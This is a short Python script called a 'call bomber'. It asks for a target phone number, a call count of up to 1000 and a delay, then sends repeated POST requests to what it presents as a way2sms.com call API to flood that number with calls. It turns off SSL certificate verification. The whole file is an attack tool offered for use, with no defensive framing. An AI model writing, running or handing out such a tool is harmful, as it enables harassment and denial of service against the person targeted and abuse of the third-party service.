import requests
import time

def call_bomber():
    phone_number = input("📞 Enter Target Phone Number: ")
    call_count = int(input("📞 How many Calls to make? (Max 1000): "))
    delay = int(input("⏱ Enter delay between calls (in seconds): "))

    url = "https://www.way2sms.com/api/v1/call"
    payload = {
        "phone": phone_number
    }

    for i in range(call_count):
        print(f"📞 Bombing {i+1}/{call_count} Call to {phone_number}")
        try:
            response = requests.post(url, data=payload, verify=False)  # 🚀 DISABLE SSL VERIFICATION
            if response.status_code == 200:
                print(f"✅ Call {i+1} Sent Successfully!")
            else:
                print(f"❌ Failed to send Call {i+1}")
        except Exception as e:
            print(f"❌ Error: {e}")

        time.sleep(delay)

if __name__ == "__main__":
    call_bomber()
